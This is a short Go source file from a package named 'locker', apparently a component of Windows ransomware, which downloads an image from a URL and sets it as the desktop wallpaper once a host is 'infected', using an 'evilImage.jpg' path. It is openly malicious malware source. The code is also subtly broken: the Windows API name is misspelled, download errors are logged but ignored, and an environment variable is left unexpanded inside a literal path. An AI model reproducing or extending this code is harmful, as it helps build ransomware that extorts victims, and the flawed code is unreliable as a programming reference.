package locker

import (
	"io"
	"log"
	"net/http"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32DLL           = windows.NewLazyDLL("user32.dll")
	procSystemParamInfo = user32DLL.NewProc("SystemParameterInfoW")
)

func GrabWallpaper(url string, filepath string) error {
	resp, err := http.Get(url)
	if err != nil {
		log.Println(err)
	}
	defer resp.Body.Close()

	f, err := os.Create(filepath)
	if err != nil {
		log.Println(err)
	}
	defer f.Close()

	_, err = io.Copy(f, resp.Body)
	return err
}

// WallPaper changes the background for the Windows OS
func WallPaper() {
	//specify image to be used to change the screen once windows host is infected.
	image, err := windows.UTF16PtrFromString(`C:\Users\%USERPROFILE%\Pictures\evilImage.jpg`)
	if err != nil {
		log.Fatal(err)
	}
	procSystemParamInfo.Call(20, 0, uintptr(unsafe.Pointer(image)), 0x001A)
}
